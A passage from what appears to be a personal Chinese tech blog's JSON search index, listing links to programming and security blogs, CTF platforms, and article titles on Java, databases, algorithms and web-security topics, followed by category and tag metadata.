&nbsp;&nbsp;&nbsp;&nbsp;leetcode&nbsp;&nbsp;&nbsp;&nbsp;牛客网LintCode-Logo 算法linqiwHawsteinJaylen&nbsp;&nbsp;&nbsp;&nbsp;红脸书生&nbsp;&nbsp;&nbsp;&nbsp;YSOcean&nbsp;&nbsp;&nbsp;&nbsp;算法网&nbsp;&nbsp;&nbsp;&nbsp;火星十一郎&nbsp;&nbsp;&nbsp;&nbsp;Alex_McAvo&nbsp;&nbsp;&nbsp;&nbsp;Angel_Kitty林夕-梦 编程之美javadoop开发者头条阮一峰的网络日志&nbsp;&nbsp;&nbsp;&nbsp;力扣&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Python之禅&nbsp;&nbsp;&nbsp;&nbsp;Jimmy&nbsp;&nbsp;&nbsp;&nbsp;运维之路&nbsp;&nbsp;&nbsp;&nbsp;纯洁的微笑&nbsp;&nbsp;&nbsp;&nbsp;倔客张&nbsp;&nbsp;&nbsp;&nbsp;旷世的忧伤&nbsp;&nbsp;&nbsp;&nbsp;三点水&nbsp;&nbsp;&nbsp;&nbsp;mojotv&nbsp;&nbsp;&nbsp;&nbsp;InfoQ&nbsp;&nbsp;&nbsp;&nbsp;天码营 知名网站i春秋&nbsp;&nbsp;&nbsp;&nbsp;先知社区&nbsp;&nbsp;&nbsp;&nbsp;安全客&nbsp;&nbsp;&nbsp;&nbsp;freebuf&nbsp;&nbsp;&nbsp;&nbsp;嘶吼&nbsp;&nbsp;&nbsp;&nbsp;知道创宇paper&nbsp;&nbsp;&nbsp;&nbsp;安全脉搏&nbsp;&nbsp;&nbsp;&nbsp;MottoIN&nbsp;&nbsp;&nbsp;&nbsp;WLGF&nbsp;&nbsp;&nbsp;&nbsp;黑吧安全网&nbsp;&nbsp;&nbsp;&nbsp;铁匠运维网&nbsp;&nbsp;&nbsp;&nbsp;tools&nbsp;&nbsp;&nbsp;&nbsp;91ri&nbsp;&nbsp;&nbsp;&nbsp;secwiki&nbsp;&nbsp;&nbsp;&nbsp;比戈大牛&nbsp;&nbsp;&nbsp;&nbsp;四叶草安全实验室&nbsp;&nbsp;&nbsp;&nbsp;长亭科技&nbsp;&nbsp;&nbsp;&nbsp;天融信阿尔法实验室&nbsp;&nbsp;&nbsp;&nbsp;奇虎360技术博客&nbsp;&nbsp;&nbsp;&nbsp;kail中文网&nbsp;&nbsp;&nbsp;&nbsp;安全盒子&nbsp;&nbsp;&nbsp;&nbsp; ctf博客chybeta&nbsp;&nbsp;&nbsp;&nbsp;Go0s @ 老 锥&nbsp;&nbsp;&nbsp;&nbsp;smi1e&nbsp;&nbsp;&nbsp;&nbsp;Xiaoxi&nbsp;&nbsp;&nbsp;&nbsp;ctf wiki&nbsp;&nbsp;&nbsp;&nbsp;Maskray&nbsp;&nbsp;&nbsp;&nbsp;Codemonster&nbsp;&nbsp;&nbsp;&nbsp;离别歌&nbsp;&nbsp;&nbsp;&nbsp;乘物游心&nbsp;&nbsp;&nbsp;&nbsp;WinterSun&nbsp;&nbsp;&nbsp;&nbsp;Wupco&nbsp;&nbsp;&nbsp;&nbsp;Mang0&nbsp;&nbsp;&nbsp;&nbsp;柠檬&nbsp;&nbsp;&nbsp;&nbsp;venenof&nbsp;&nbsp;&nbsp;&nbsp;bendawang&nbsp;&nbsp;&nbsp;&nbsp;p猫&nbsp;&nbsp;&nbsp;&nbsp;shiyan&nbsp;&nbsp;&nbsp;&nbsp;Pupiles &nbsp;&nbsp;&nbsp;&nbsp;国光&nbsp;&nbsp;&nbsp;&nbsp;Cytosine&nbsp;&nbsp;&nbsp;&nbsp;一叶飘零&nbsp;&nbsp;&nbsp;&nbsp;K0rz3n&nbsp;&nbsp;&nbsp;&nbsp;腹黑&nbsp;&nbsp;&nbsp;&nbsp; wfox &nbsp;&nbsp;&nbsp;&nbsp;eternalsakura13&nbsp;&nbsp;&nbsp;&nbsp;南溟&nbsp;&nbsp;&nbsp;&nbsp;乐清小俊杰&nbsp;&nbsp;&nbsp;&nbsp;wupco&nbsp;&nbsp;&nbsp;&nbsp;mang0&nbsp;&nbsp;&nbsp;&nbsp;rois&nbsp;&nbsp;&nbsp;&nbsp;夜色茫茫&nbsp;&nbsp;&nbsp;&nbsp;道格&nbsp;&nbsp;&nbsp;&nbsp;奈沙夜影&nbsp;&nbsp;&nbsp;&nbsp; ctf训练实验吧 &nbsp;&nbsp;&nbsp;&nbsp;bugku&nbsp;&nbsp;&nbsp;&nbsp;jarvisoj&nbsp;&nbsp;&nbsp;&nbsp;南京邮电大学网络攻防训练平台&nbsp;&nbsp;&nbsp;&nbsp;网络信息安全攻防学习平台&nbsp;&nbsp;&nbsp;&nbsp;enigmagroup&nbsp;&nbsp;&nbsp;&nbsp;pwnable.kr &nbsp;&nbsp;&nbsp;&nbsp;pwnable.tw&nbsp;&nbsp;&nbsp;&nbsp;HITCON-Training&nbsp;&nbsp;&nbsp;&nbsp;reversing.kr&nbsp;&nbsp;&nbsp;&nbsp;exploit-exercises&nbsp;&nbsp;&nbsp;&nbsp;xss challenge&nbsp;&nbsp;&nbsp;&nbsp;RedTiger’s Hackit&nbsp;&nbsp;&nbsp;&nbsp;HackThis&nbsp;&nbsp;&nbsp;&nbsp; root me&nbsp;&nbsp;&nbsp;&nbsp;ctf&nbsp;&nbsp;&nbsp;&nbsp;ctf&nbsp;&nbsp;&nbsp;&nbsp;铁三&nbsp;&nbsp;&nbsp;&nbsp;ctf&nbsp;&nbsp;&nbsp;&nbsp; 渗透测试浮萍ADog&nbsp;&nbsp;&nbsp;&nbsp;lsablog&nbsp;&nbsp;&nbsp;&nbsp;Arkteam&nbsp;&nbsp;&nbsp;&nbsp;漏洞时代&nbsp;&nbsp;&nbsp;&nbsp;洞悉漏洞&nbsp;&nbsp;&nbsp;&nbsp;独自等待&nbsp;&nbsp;&nbsp;&nbsp;三好学生&nbsp;&nbsp;&nbsp;&nbsp;vulnspy&nbsp;&nbsp;&nbsp;&nbsp;evilcg&nbsp;&nbsp;&nbsp;&nbsp;freearoot&nbsp;&nbsp;&nbsp;&nbsp;sky&nbsp;&nbsp;&nbsp;&nbsp;贫民窟的艺术家&nbsp;&nbsp;&nbsp;&nbsp;rcoil&nbsp;&nbsp;&nbsp;&nbsp;bypass&nbsp;&nbsp;&nbsp;&nbsp;zerokeeper&nbsp;&nbsp;&nbsp;&nbsp;冷白开&nbsp;&nbsp;&nbsp;&nbsp;不发光&nbsp;&nbsp;&nbsp;&nbsp;暗月博客&nbsp;&nbsp;&nbsp;&nbsp;webshell&nbsp;&nbsp;&nbsp;&nbsp;阿城&nbsp;&nbsp;&nbsp;&nbsp;中国白客联盟&nbsp;&nbsp;&nbsp;&nbsp;tom0li&nbsp;&nbsp;&nbsp;&nbsp;王艾&nbsp;&nbsp;&nbsp;&nbsp;星空浪子&nbsp;&nbsp;&nbsp;&nbsp;西门吹雪&nbsp;&nbsp;&nbsp;&nbsp;Shun&nbsp;&nbsp;&nbsp;&nbsp;二宝&nbsp;&nbsp;&nbsp;&nbsp;任我乐&nbsp;&nbsp;&nbsp;&nbsp;chabug&nbsp;&nbsp;&nbsp;&nbsp;黑客seo学习&nbsp;&nbsp;&nbsp;&nbsp;lu4n&nbsp;&nbsp;&nbsp;&nbsp; 逆向分析吾爱破解&nbsp;&nbsp;&nbsp;&nbsp;看雪论坛&nbsp;&nbsp;&nbsp;&nbsp;逆向未来&nbsp;&nbsp;&nbsp;&nbsp;muhe&nbsp;&nbsp;&nbsp;&nbsp;hacktech&nbsp;&nbsp;&nbsp;&nbsp;whklhhhh&nbsp;&nbsp;&nbsp;&nbsp;tacxingxing&nbsp;&nbsp;&nbsp;&nbsp;KSSD&nbsp;&nbsp;&nbsp;&nbsp; 文章搜索Sec-News &nbsp;&nbsp;&nbsp;&nbsp;Paper&nbsp;&nbsp;&nbsp;&nbsp;NaviSec.it – 纳威安全导航&nbsp;&nbsp;&nbsp;&nbsp; 安全导航安全行业全景图 &nbsp;&nbsp;&nbsp;&nbsp;纳威安全导航 &nbsp;&nbsp;&nbsp;&nbsp;安全脉搏导航 &nbsp;&nbsp;&nbsp;&nbsp;黑客榜中榜 &nbsp;&nbsp;&nbsp;&nbsp; 安全圈Info导航 &nbsp;&nbsp;&nbsp;&nbsp; SecNavi导航&nbsp;&nbsp;&nbsp;&nbsp; security-tools &nbsp;&nbsp;&nbsp;&nbsp; 取证分析parker 其他小草窝&nbsp;&nbsp;&nbsp;&nbsp;KeKeFund&nbsp;&nbsp;&nbsp;&nbsp;imlonghao&nbsp;&nbsp;&nbsp;&nbsp;Metronic FrontEnd&nbsp;&nbsp;&nbsp;&nbsp;netxfly&nbsp;&nbsp;&nbsp;&nbsp;lichao890427&nbsp;&nbsp;&nbsp;&nbsp;k1two2&nbsp;&nbsp;&nbsp;&nbsp;5salt&nbsp;&nbsp;&nbsp;&nbsp;勾陈安全实验室&nbsp;&nbsp;&nbsp;&nbsp;Medici.Yan&nbsp;&nbsp;&nbsp;&nbsp;趁着年轻&nbsp;&nbsp;&nbsp;&nbsp;KANGZUBIN&nbsp;&nbsp;&nbsp;&nbsp;园长的博客&nbsp;&nbsp;&nbsp;&nbsp;leesec&nbsp;&nbsp;&nbsp;&nbsp;xcroot&nbsp;&nbsp;&nbsp;&nbsp;flygon&nbsp;&nbsp;&nbsp;&nbsp;安全讯息平台&nbsp;&nbsp;&nbsp;&nbsp;腾讯云社区&nbsp;&nbsp;&nbsp;&nbsp;v2ex&nbsp;&nbsp;&nbsp;&nbsp;网络安全研究国际学术论坛&nbsp;&nbsp;&nbsp;&nbsp;红黑联盟&nbsp;&nbsp;&nbsp;&nbsp;hack80&nbsp;&nbsp;&nbsp;&nbsp;习科小黑板 - Silic Wiki&nbsp;&nbsp;&nbsp;&nbsp;安全文库&nbsp;&nbsp;&nbsp;&nbsp;舜目安全 &nbsp;&nbsp;&nbsp;&nbsp;华盟网&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[]},{"title":"文章汇总","slug":"文章汇总","date":"2018-10-06T16:09:00.000Z","updated":"2020-04-13T07:15:08.000Z","comments":true,"path":"article/50b6847a.html","link":"","permalink":"https://blog.cfyqy.com/article/50b6847a.html","excerpt":"网络搜罗来的文章","text":"网络搜罗来的文章 操作系统window批处理常用命令总结 linuxLinux之特殊权限SUID/SGID/SBIT 面试JAVA工程师面试常见问题集锦 想成为顶尖 Java 程序员？请先过了下面这些技术问题。 渗透测试面试问题2019版，内含大量渗透技巧 面试必会之HashMap源码分析 mysql浅析MySQL事务中的redo与undoRedo LogUndo LogMySQL Glossaryexplain常见的优化bin logMySQL 是怎样运行的：从根儿上理解 MySQLmysql InnoDB锁等待的查看及分析sql语句练习50题Mysql版 算法数据结构与算法-回溯法-4Java经典算法50题 编程语言javaJava反射详解理解JAVA注解spring mvc mytatis思维导图spring教程1Spring基本应用2Spring数据库开发spring mvc教程1SpringMVC基本应用2SSM整合开发mybatis1MyBatis基本应用2MyBatis进阶3MyBatis与Spring整合Spring Boot 系列文章Spring Cloud 系列文章springboot教程SpringBoot 源码精读 MyBatis-Plus从 0 开始手写一个 Spring MVC 框架，向高手进阶！Java 必看的 Spring 知识汇总！Java开发中的23种设计模式详解java23中设计模型设计模式也可以这么简单Java虚拟机（JVM）你只要看这一篇就够了！ 由HashMap哈希算法引出的求余%和与运算&amp;转换问题给定一个正整型数值，如何获取该数下一个2的n次幂值HashMap.comparableClassFor方法解读：类型/泛型相关方法Java中Collections.sort()排序详解HashMap源码分析jdk1.8java虚拟机参数配置大全 python python3-cookbook史上最全 Python 面向对象编程Django 基础教程Django-ORM-学习笔记django视频教程Flask 0.10.1文档flask教程w3cschool nodejs七天学会NodeJSexpress框架官方教程 phpphp中文手册 机器学习tensorflowtensorflow入门教程TensorFlow下利用MNIST训练模型识别手写数字使用Tensorflow和MNIST识别自己手写的数字字母和数字训练数据tensorflow_BasicsTensorFlow_MNIST 搜索引擎爬虫Scrapy1.5中文文档Scrapy 0.24 文档 elasticsearchelasticsearch不错教程elasticsearch权威教程全文搜索引擎 Elasticsearch 入门教程ElasticSearch聚合聚合搜索elasticsearch博客学习 reverse逆向基础速成-1 pwnctfwikipwn入门的一些学习资料Linux (x86) Exploit Development Series[Classic Stack Based Buffer Overflow](Classic Stack Based Buffer Overflow) web安全pythonpython安全和代码审计相关资料收集 python_audit.pdfpython_audit_xfkxfk.pdfPython_Hack.pdfpython-webshellPython PyYAML反序列化漏洞实验和Payload构造format注入Python urllib HTTP头注入漏洞Hack Redis via Python urllib HTTP Header InjectionPython沙箱逃逸的n种姿势Python Sandbox Bypass文件解压之过 Python中的代码执行Exploiting Python PIL Module Command Execution VulnerabilityPython Pickle的任意代码执行漏洞实践和Payload构造Jinja2 template injection filter bypassespython富文本XSS过滤器LDAP注入python-flask-ssti模版注入漏洞浅析SSTI(python沙盒绕过)Flask/jinja2与SSTI「服务端模版注入攻击」 javaJAVA安全编码与代码审计.md nodejs sql注入注入方式MySQL时间盲注五种延时方法 SQL 注入总结SQL注入WIKISQL 注入md5注入SQL带外通道注入Dnslog在SQL注入中的实战SQL注入防御与绕过的几种姿势MySQL绕过WAF实战技巧SQL注入的“冷门姿势”SQL注入之骚姿势小记 mysql史上最水的MYSQL注入总结MySQL Injection in Update, Insert and DeleteMysql下Limit注入方法宽字节注入mysql约束攻击Mysql Order By注入总结MySQL注入系列之二次注入(三) mssql progressql MongoDB 逻辑漏洞 同源策略漫谈同源策略攻防再谈同源策略跨域资源共享 CORS 详解跨域方法总结CSP Is Dead, Long Live CSP! 前端防御从入门到弃坑–CSP变迁严格 CSP 下的几种有趣的思路 csrf用代码来细说Csrf漏洞危害以及防御SSRF漏洞的利用与学习Cookie-Form型CSRF防御机制的不足与反思CSRF攻击与防御浅谈Session机制及CSRF攻防关于JSON CSRF的一些思考CSRF 花式绕过Referer技巧当代 Web 的 JSON 劫持技巧 xxs漏洞解码顺序Deep dive into browser parsing and XSS payload encoding前端HACK之XSS攻击个人学习笔记xss小结记一次从DOM型XSS到RCE过程驱散前端安全梦魇——DOMXSS典型场景分析与修复指南DOMXSS WikiXSS Filter Evasion Cheat Sheet疯狂的跨站之行不常见的xss利用探索输入长度受限情况下的 XSS 攻击先知XSS挑战赛 - L3m0n Writeup ssrf漏洞ctf-wikiSSRF 服务端请求伪造腾讯某处SSRF漏洞(非常好的利用点)附利用脚SSRF漏洞中绕过IP限制的几种方法总结SSRF漏洞分析与利用Use DNS Rebinding to Bypass SSRF in JavaSSRF-TipsSSRF(服务端请求伪造)《白帽子讲漏洞修复与防御》书籍样稿 xxe漏洞浅谈XXE漏洞攻击与防御XML实体注入漏洞的利用与学习blind-xxe-learningxxe-cheat-sheetXML? Be cautious!xxe漏洞黑夜的猎杀-盲打XXE jsonp注入关于跨域和jsonp的一些理解(新手向)一次关于JSONP的小实验与总结JSONP注入解析JSONP 安全攻防技术 命令、代码执行命令执行PHP Code Injection Analysis从PHP源码与扩展开发谈PHP任意代码执行与防御利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令WAF-Bypass正则表达式使用不当引发的系统命令执行漏洞shelling在PHP应用程序开发中不正当使用mail()函数引发的血案Hack PHP mail additional_parameters命令注入突破长度限制 文件包含php文件包含漏洞一道日志包含RCE with LFI and SSH Log Poisoningshell via LFI - proc/self/environ methodprocselffd-lfi-methodLFI Cheat SheetLFI With PHPInfo Assistance 文件上传解析漏洞文件解析漏洞总结Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 文件上传总结 文件包含漏洞php文件包含漏洞文件包含漏洞一文件包含漏洞二 php反序列化漏洞浅谈php反序列化漏洞PHP中SESSION反序列化机制magic函数__wakeup()引发的漏洞利用 phar 拓展 php 反序列化漏洞攻击面 php伪协议总结浅谈php伪协议及在CTF比赛中的应用php 伪协议PHP伪协议分析与应用php反序列化拓展攻击详解 php伪随机数问题[Cracking PHP rand()](http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/ 随机数之前也是ctf的常见姿势 ) php的随机数的安全性分析php里的随机数 php弱类型PHP弱类型安全问题总结 php变脸覆盖变量覆盖漏洞变量覆盖漏洞 渗透测试信息收集 渗透技巧对基础 shell 进行流量混淆基于ATT&amp;CK框架的红蓝对抗，有效提升检测能力 漏洞收集 中间件漏洞Apache Tomcat样例目录session操纵漏洞ImageMagick漏洞汇总利用ImageMagick漏洞绕过disable_functionImageMagick远程代码执行漏洞分析 提权 工具SQLMAP源码分析Part1流程篇 windowlinux脏牛提权 内网渗透ctf杂项CTF中遇到的隐写术总结CTF比赛中关于zip的总结 密码学取证分析 二进制 其他攻击和审计Docker容器03","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[],"author":"ye1s"},{"title":"github收集","slug":"thub收集","date":"2018-09-17T01:06:00.000Z","updated":"2020-06-23T05:03:54.271Z","comments":true,"path":"article/d9d9d1.html","link":"","permalink":"https://blog.cfyqy.com/article/d9d9d1.html","excerpt":"github中文社区","text":"github中文社区 学习资料北大课程资料民间整理 浙江大学课程攻略共享计划正则表达式学习2019年最新总结，阿里，腾讯，百度，美团，头条等技术面试题l 2019，后台技术栈/架构师之路/全栈开发社区，春招/秋招/校招/面试 ensorFlow的笔记和代码 分享最新BAT面试题(包含机器学习,Linux,PHP,大数据,Python,Java,前端…) 编程之美java【Java学习+面试指南】 一份涵盖大部分Java程序员所需要掌握的核心知识技术面试必备基础知识、Leetcode 题解、后端面试、Java 面试、春招、秋招、操作系统、计算机网络、系统设计mall项目是一套电商系统，包括前台商城系统及后台管理系统，基于SpringBoot+MyBatis实现互联网 Java 工程师进阶知识完全扫盲《后端架构师技术图谱》To Be Top Javaer - Java工程师成神之路java设计模式循序渐进，学习Spring spring boot demo 是一个用来深度学习并实战 spring boot 的项目 pythonPython - 100天从新手到大师所有算法都在的Python中实现每日自动给女朋友发微信暖心话 前端zdog-Round, flat, designer-friendly pseudo-3D engine前端入门和进阶学习笔记，超详细的Web前端学习图文教程 web史上最全的整合第三方登录的开源库 算法Wiki for OI / ICPC.某大型游戏线上攻略，内含炫酷算术魔法LeetCode Animation All in Oneleetcode 题解，记录自己的 leetcode 解题之路 机器学习《神经网络与深度学习》 南瓜书，本书为西瓜书的一些细微补充，周志华老师的《机器学习》（西瓜书）是机器学习领域的经典入门教材之一一款换脸工具。利用深度学习技术，识别并更换图片或视频中的人脸 linuxlinux内核源码 信息安全CMS漏洞测试用例集合各种开源CMS 各种版本的漏洞以及EXP 该项目将不断更新Micro8 业务逻辑2019年最新总结，从程序员到CTO，从专业走向卓越，分享大牛企业内部pdf与PPT 精巧工具常用的 Git 命令和一些小技巧，号称Git的奇技淫巧收集了许多很棒的设计工具，诸如动画工具、AR、字体工具、渐变工具、代码工具等等nps一款轻量级、功能强大的内网穿透代理服务器 其他Material X中华古诗中国表情包大集合磁力搜网页版 - 磁力链接聚合搜索 DATA中国大陆 31 个省份1978 年至 2019 年一千多万工商企业注册信息","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/tags/%E5%85%B6%E4%BB%96/"}]}],"categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"},{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"},{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"加密编码","slug":"加密编码","permalink":"https://blog.cfyqy.com/categories/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81/"},{"name":"中间件","slug":"中间件","permalink":"https://blog.cfyqy.com/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/categories/ctf/"},{"name":"网络通信","slug":"网络通信","permalink":"https://blog.cfyqy.com/categories/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/"},{"name":"应急响应","slug":"应急响应","permalink":"https://blog.cfyqy.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"AWD","slug":"AWD","permalink":"https://blog.cfyqy.com/tags/AWD/"},{"name":"无回显命令执行","slug":"无回显命令执行","permalink":"https://blog.cfyqy.com/tags/%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"htaccess","slug":"htaccess","permalink":"https://blog.cfyqy.com/tags/htaccess/"},{"name":"exist","slug":"exist","permalink":"https://blog.cfyqy.com/tags/exist/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://blog.cfyqy.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"PHP session","slug":"PHP-session","permalink":"https://blog.cfyqy.com/tags/PHP-session/"},{"name":"端口转发","slug":"端口转发","permalink":"https://blog.cfyqy.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"Mimikatz","slug":"Mimikatz","permalink":"https://blog.cfyqy.com/tags/Mimikatz/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://blog.cfyqy.com/tags/Metasploit/"},{"name":"PGP","slug":"PGP","permalink":"https://blog.cfyqy.com/tags/PGP/"},{"name":"GnuPG","slug":"GnuPG","permalink":"https://blog.cfyqy.com/tags/GnuPG/"},{"name":"HTTP","slug":"HTTP","permalink":"https://blog.cfyqy.com/tags/HTTP/"},{"name":"apache","slug":"apache","permalink":"https://blog.cfyqy.com/tags/apache/"},{"name":"nginx","slug":"nginx","permalink":"https://blog.cfyqy.com/tags/nginx/"},{"name":"mysql","slug":"mysql","permalink":"https://blog.cfyqy.com/tags/mysql/"},{"name":"redis","slug":"redis","permalink":"https://blog.cfyqy.com/tags/redis/"},{"name":"JWT","slug":"JWT","permalink":"https://blog.cfyqy.com/tags/JWT/"},{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"反序列化","slug":"反序列化","permalink":"https://blog.cfyqy.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Flask","slug":"Flask","permalink":"https://blog.cfyqy.com/tags/Flask/"},{"name":"debug","slug":"debug","permalink":"https://blog.cfyqy.com/tags/debug/"},{"name":"SSTI","slug":"SSTI","permalink":"https://blog.cfyqy.com/tags/SSTI/"},{"name":"javascript","slug":"javascript","permalink":"https://blog.cfyqy.com/tags/javascript/"},{"name":"命令执行","slug":"命令执行","permalink":"https://blog.cfyqy.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/tags/ctf/"},{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.cfyqy.com/tags/XSS/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"信息收集","permalink":"https://blog.cfyqy.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"sql注入","slug":"sql注入","permalink":"https://blog.cfyqy.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"ATT&CK","slug":"ATT-CK","permalink":"https://blog.cfyqy.com/tags/ATT-CK/"},{"name":"Discovery","slug":"Discovery","permalink":"https://blog.cfyqy.com/tags/Discovery/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://blog.cfyqy.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Initial_Access","slug":"Initial-Access","permalink":"https://blog.cfyqy.com/tags/Initial-Access/"},{"name":"base64","slug":"base64","permalink":"https://blog.cfyqy.com/tags/base64/"},{"name":"sql盲注","slug":"sql盲注","permalink":"https://blog.cfyqy.com/tags/sql%E7%9B%B2%E6%B3%A8/"},{"name":"渗透工具","slug":"渗透工具","permalink":"https://blog.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"},{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"https://blog.cfyqy.com/tags/cobaltstrike/"},{"name":"域渗透","slug":"域渗透","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"委派","slug":"委派","permalink":"https://blog.cfyqy.com/tags/%E5%A7%94%E6%B4%BE/"},{"name":"SPN","slug":"SPN","permalink":"https://blog.cfyqy.com/tags/SPN/"},{"name":"域基础","slug":"域基础","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E5%9F%BA%E7%A1%80/"},{"name":"域信息收集","slug":"域信息收集","permalink":"https://blog.cfyqy.com/tags/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"web漏洞","slug":"web漏洞","permalink":"https://blog.cfyqy.com/tags/web%E6%BC%8F%E6%B4%9E/"},{"name":"XSS+SSRF","slug":"XSS-SSRF","permalink":"https://blog.cfyqy.com/tags/XSS-SSRF/"},{"name":"Kerberos","slug":"Kerberos","permalink":"https://blog.cfyqy.com/tags/Kerberos/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://blog.cfyqy.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"window","slug":"window","permalink":"https://blog.cfyqy.com/tags/window/"},{"name":"访问控制模型","slug":"访问控制模型","permalink":"https://blog.cfyqy.com/tags/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B/"},{"name":"WAF","slug":"WAF","permalink":"https://blog.cfyqy.com/tags/WAF/"},{"name":"DDOS","slug":"DDOS","permalink":"https://blog.cfyqy.com/tags/DDOS/"},{"name":"应急响应","slug":"应急响应","permalink":"https://blog.cfyqy.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"业务逻辑漏洞","slug":"业务逻辑漏洞","permalink":"https://blog.cfyqy.com/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"java线程池","slug":"java线程池","permalink":"https://blog.cfyqy.com/tags/java%E7%BA%BF%E7%A8%8B%E6%B1%A0/"},{"name":"设计模式","slug":"设计模式","permalink":"https://blog.cfyqy.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"编程语言","slug":"编程语言","permalink":"https://blog.cfyqy.com/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"经典问题","slug":"经典问题","permalink":"https://blog.cfyqy.com/tags/%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98/"},{"name":"数据结构","slug":"数据结构","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"图","slug":"图","permalink":"https://blog.cfyqy.com/tags/%E5%9B%BE/"},{"name":"分支限界算法","slug":"分支限界算法","permalink":"https://blog.cfyqy.com/tags/%E5%88%86%E6%94%AF%E9%99%90%E7%95%8C%E7%AE%97%E6%B3%95/"},{"name":"快慢指针","slug":"快慢指针","permalink":"https://blog.cfyqy.com/tags/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88/"},{"name":"数组","slug":"数组","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E7%BB%84/"},{"name":"哈希表","slug":"哈希表","permalink":"https://blog.cfyqy.com/tags/%E5%93%88%E5%B8%8C%E8%A1%A8/"},{"name":"队列","slug":"队列","permalink":"https://blog.cfyqy.com/tags/%E9%98%9F%E5%88%97/"},{"name":"树","slug":"树","permalink":"https://blog.cfyqy.com/tags/%E6%A0%91/"},{"name":"链表","slug":"链表","permalink":"https://blog.cfyqy.com/tags/%E9%93%BE%E8%A1%A8/"},{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"数学","slug":"数学","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E5%AD%A6/"},{"name":"回溯","slug":"回溯","permalink":"https://blog.cfyqy.com/tags/%E5%9B%9E%E6%BA%AF/"},{"name":"分治","slug":"分治","permalink":"https://blog.cfyqy.com/tags/%E5%88%86%E6%B2%BB/"},{"name":"二分法","slug":"二分法","permalink":"https://blog.cfyqy.com/tags/%E4%BA%8C%E5%88%86%E6%B3%95/"},{"name":"two指针","slug":"two指针","permalink":"https://blog.cfyqy.com/tags/two%E6%8C%87%E9%92%88/"},{"name":"贪心思想","slug":"贪心思想","permalink":"https://blog.cfyqy.com/tags/%E8%B4%AA%E5%BF%83%E6%80%